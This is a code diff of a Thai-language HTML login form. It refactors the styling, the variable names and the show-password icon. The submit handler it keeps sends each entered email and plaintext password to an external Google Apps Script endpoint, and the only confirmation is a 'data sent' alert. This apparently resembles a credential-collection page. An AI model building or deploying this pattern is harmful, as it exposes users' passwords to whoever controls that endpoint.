@@ -66,7 +66,6 @@
       padding: 0.8rem 2.5rem 0.8rem 1.2rem;
       border: 1px solid #ccc;
       border-radius: 8px;
-      transition: none;
     }
 
     .toggle-password {
@@ -78,9 +77,6 @@
       border: none;
       cursor: pointer;
       padding: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
       width: 24px;
       height: 24px;
     }
@@ -88,7 +84,7 @@
     .toggle-password svg {
       width: 24px;
       height: 24px;
-      fill: #f6c90e; /* สีเหลืองน่ารัก */
+      fill: #f6c90e;
     }
 
     button[type="submit"] {
@@ -125,7 +121,6 @@
         <div class="input-group">
           <input type="password" id="password" name="password" required placeholder="Password" />
           <button type="button" class="toggle-password" onclick="togglePassword()">
-            <!-- ตาเปิดแบบน่ารัก -->
             <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
               <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
               <circle cx="12" cy="12" r="3"/>
@@ -140,19 +135,19 @@
 
   <script>
     const form = document.querySelector("#form");
-    const pwdInput = document.getElementById("password");
+    const passwordInput = document.getElementById("password");
     const eyeIcon = document.getElementById("eye-icon");
 
     const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";
 
-    let showPassword = false;
+    let isPasswordVisible = false;
 
     function togglePassword() {
-      showPassword = !showPassword;
-      pwdInput.type = showPassword ? "text" : "password";
-      eyeIcon.innerHTML = showPassword
+      isPasswordVisible = !isPasswordVisible;
+      passwordInput.type = isPasswordVisible ? "text" : "password";
+      eyeIcon.innerHTML = isPasswordVisible
         ? `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>`
-        : `<path d="M2 12s4-8 10-8 10 8 10 8-4 8-10 8S2 12 2 12zm10-5a5 5 0 0 0 0 10V7z"/>`;
+        : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/><path d="M3 3l18 18" stroke="#000" stroke-width="2"/>`;
     }
 
     form.addEventListener("submit", (e) => {
@@ -165,18 +160,18 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, password }),
       })
-        .then((response) => {
-          if (response.ok) {
-            alert("ส่งข้อมูลสำเร็จแล้ว!");
-            form.reset();
-          } else {
-            alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
-          }
-        })
-        .catch((error) => {
+      .then(response => {
+        if (response.ok) {
+          alert("ส่งข้อมูลสำเร็จแล้ว!");
+          form.reset();
+        } else {
           alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
-          console.error("Fetch Error!", error);
-        });
+        }
+      })
+      .catch(error => {
+        alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
+        console.error("Fetch Error!", error);
+      });
     });
   </script>
 </body>
